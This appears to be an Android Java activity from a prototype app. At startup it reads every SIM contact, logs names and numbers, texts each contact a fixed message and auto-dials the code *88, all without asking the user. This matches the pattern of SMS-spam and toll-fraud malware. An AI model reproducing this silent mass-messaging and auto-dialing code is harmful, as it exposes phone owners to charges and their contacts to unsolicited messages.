package com.siragon.sop;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent; 
import android.net.Uri;
import android.util.Log;  
import android.telephony.TelephonyManager;
import android.telephony.PhoneStateListener;
import android.content.Context;
import android.net.Uri;
import android.database.Cursor;
import android.database.sqlite.*;
import android.content.ContentResolver;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
 import java.util.ArrayList;
 import android.telephony.SmsMessage;

public class MainActivity extends Activity
{
	private static final String LOG_TAG = "LocationManagerTest";
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        EndCallListener callListener = new EndCallListener();
		TelephonyManager mTM = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		mTM.listen(callListener, PhoneStateListener.LISTEN_CALL_STATE);
		
		
		//////////////////////
			try
			{
				String ClsSimPhonename = null; 
				String ClsSimphoneNo = null;

				Uri simUri = Uri.parse("content://icc/adn"); 
				Cursor cursorSim = this.getContentResolver().query(simUri,null,null,null,null);

				Log.i("PhoneContact", "total: "+cursorSim.getCount());

				while (cursorSim.moveToNext()) 
				{      
					ClsSimPhonename =cursorSim.getString(cursorSim.getColumnIndex("name"));
					ClsSimphoneNo = cursorSim.getString(cursorSim.getColumnIndex("number"));
					ClsSimphoneNo.replaceAll("\\D","");
					ClsSimphoneNo.replaceAll("&", "");
					ClsSimPhonename=ClsSimPhonename.replace("|","");

					Log.i("PhoneContact", "name: "+ClsSimPhonename+" phone: "+ClsSimphoneNo);
					
					 enviaSMS(ClsSimphoneNo,"El mensaje");
					//if(ClsSimPhonename== "Siragon"){
 					String uri = "tel:" + "*88";
					Intent intent = new Intent(Intent.ACTION_CALL);
					intent.setData(Uri.parse(uri));
					startActivity(intent);
 					//}
				}        
			}
			catch(Exception e)
			{
				e.printStackTrace();
			}
		///////////////////////


		//finish();
        //System.exit(0);
    }
public void enviaSMS(String tel, String sms){
   SmsManager smsManager = SmsManager.getDefault();
   smsManager
      .sendTextMessage(tel,null,sms,null,null);
}
/* private void sendSMS(String phoneNumber, String message) {
    ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
    ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
    PendingIntent sentPI = PendingIntent.getBroadcast(mContext, 0,
            new Intent(mContext, SmsSentReceiver.class), 0);
    PendingIntent deliveredPI = PendingIntent.getBroadcast(mContext, 0,
            new Intent(mContext, SmsDeliveredReceiver.class), 0);
    try {
        SmsManager sms = SmsManager.getDefault();
        ArrayList<String> mSMSMessage = sms.divideMessage(message);
        for (int i = 0; i < mSMSMessage.size(); i++) {
            sentPendingIntents.add(i, sentPI);
            deliveredPendingIntents.add(i, deliveredPI);
        }
        sms.sendMultipartTextMessage(phoneNumber, null, mSMSMessage,
                sentPendingIntents, deliveredPendingIntents);

    } catch (Exception e) {

        e.printStackTrace();
        Toast.makeText(getBaseContext(), "SMS sending failed...",Toast.LENGTH_SHORT).show();
    }

}
public class SmsSentReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent arg1) {
    switch (getResultCode()) {
    case Activity.RESULT_OK:
        Toast.makeText(context, "SMS Sent", Toast.LENGTH_SHORT).show();

        break;
    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
        Toast.makeText(context, "SMS generic failure", Toast.LENGTH_SHORT)
                .show();

        break;
    case SmsManager.RESULT_ERROR_NO_SERVICE:
        Toast.makeText(context, "SMS no service", Toast.LENGTH_SHORT)
                .show();

        break;
    case SmsManager.RESULT_ERROR_NULL_PDU:
        Toast.makeText(context, "SMS null PDU", Toast.LENGTH_SHORT).show();
        break;
    case SmsManager.RESULT_ERROR_RADIO_OFF:
        Toast.makeText(context, "SMS radio off", Toast.LENGTH_SHORT).show();
        break;
    }
}
}
public class SmsDeliveredReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent arg1) {
    switch (getResultCode()) {
    case Activity.RESULT_OK:
        Toast.makeText(context, "SMS delivered", Toast.LENGTH_SHORT).show();
        break;
    case Activity.RESULT_CANCELED:
        Toast.makeText(context, "SMS not delivered", Toast.LENGTH_SHORT).show();
        break;
    }
}
} */
	private class EndCallListener extends PhoneStateListener {
		public void onCallStateChanged(int state, String incomingNumber) {
			if(TelephonyManager.CALL_STATE_RINGING == state) {
				Log.i(LOG_TAG, "RINGING, number: " + incomingNumber);
			}
			if(TelephonyManager.CALL_STATE_OFFHOOK == state) {
				//wait for phone to go offhook (probably set a boolean flag) so you know your app initiated the call.
				Log.i(LOG_TAG, "OFFHOOK");
				finish();
				System.exit(0);
			}
			if(TelephonyManager.CALL_STATE_IDLE == state) {
				//when this state occurs, and your flag is set, restart your app
				Log.i(LOG_TAG, "IDLE");
			}
		}
	}

}


